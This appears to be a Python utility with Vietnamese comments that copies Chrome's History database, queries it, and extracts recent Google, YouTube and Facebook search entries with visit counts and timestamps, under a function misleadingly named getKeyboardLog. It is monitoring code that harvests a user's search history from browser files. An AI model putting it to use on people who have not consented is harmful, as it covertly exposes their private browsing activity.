import sqlite3
import shutil
import os

keyWordGoogleSearches = ['Google Tìm kiếm','Tìm trên Google','You searched for', 'Google Search']
keyWordYoutubeSearches = ["https://www.youtube.com/results?search_query", "https://www.facebook.com/search/"]

def getKeyboardLog(latestTimestamp):
    # Truy cập biến môi trường USERPROFILE trên Windows hoặc HOME trên Unix/Linux
    user_profile = os.getenv('USERPROFILE') or os.getenv('HOME')
    # Xây dựng đường dẫn đến tệp "History" của Chrome
    history_db_path = os.path.join(user_profile, 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'History')

    # Vì CSDL SQLLite của Chrome sẽ locked khi có tab chrome mở lên, 
    # vì vậy tôi sẽ copy content của history_db_path qua một file khác để handle
    # Vậy nên trước tiên tôi sẽ tạo một foudler mới để lưu trữ.

    # Đường dẫn tới thư mục mà bạn muốn tạo
    path = "C:\\history_browser"

    # Kiểm tra xem thư mục đã tồn tại hay chưa
    if not os.path.exists(path):
        # Nếu thư mục chưa tồn tại, hãy tạo nó
        os.makedirs(path)
    # Nếu đã tồn tại thì sử dụng
    history_clone_path = path

    # Sao chép tệp "History" (shutil.copy sẽ overwritten lại file)
    shutil.copy(history_db_path, history_clone_path)

    # Kết nối đến tệp SQLite
    connection = sqlite3.connect(history_clone_path+'/History')
    cursor = connection.cursor()

    # Truy vấn lịch sử duyệt web
    cursor.execute('SELECT * FROM urls')
    rows = cursor.fetchall()

    # [id, url, title, số lần truy cập trang web, số lần truy cập trực tiếp vào đường dẫn mà ko cần thông qua liên kết từ trang web khác, 
    # thời gian cuối cùng truy cập trang web,...]
    info = [] # [[url, totalVisit, createdAt],...]

    for row in rows:
        # print(row)
        for keyWordGoogleSearch in keyWordGoogleSearches:
            if keyWordGoogleSearch in row[2]:
                if row[5] == 0 or row[5] <= latestTimestamp:
                    continue
                info.append([row[2],row[3],row[5]])
                break
        for keyWordYoutubeSearch in keyWordYoutubeSearches:
            if keyWordYoutubeSearch in row[1]:
                if row[5] == 0 or row[5] <= latestTimestamp:
                    continue
                info.append([row[2],row[3],row[5]])
                break
        
    # Đóng kết nối
    connection.close()
    return info
